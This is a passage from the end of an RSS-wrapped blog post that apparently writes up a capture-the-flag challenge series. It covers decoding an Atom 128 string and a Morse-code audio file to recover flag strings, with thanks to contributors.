&lt;p&gt;UPDATE: Turns out it&amp;rsquo;s Atom 128 adn you can use &lt;a href=&#34;http://crypo.in.ua/tools/eng_atom128c.php&#34;&gt;this site&lt;/a&gt;
to decode it to &lt;code&gt;infosec_flagis_rceatomized&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Thanks to Anon and @fr1t3 for the info&lt;/p&gt;

&lt;p&gt;ALL FLAGS DONE&lt;/p&gt;

&lt;h2 id=&#34;the-lost-level:aad69195db02279e47989643f4843312&#34;&gt;The lost level&lt;/h2&gt;

&lt;p&gt;UPDATED: This has since been removed, but I&amp;rsquo;ve left this here for posterity.&lt;/p&gt;

&lt;p&gt;Not sure where this belongs, but in the misc folder is a file called &lt;code&gt;readme.wav&lt;/code&gt;
which contains the morsecode for&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;INFOSECFLAGISMORSECODETONES
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Which level this belongs to, I don&amp;rsquo;t know.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>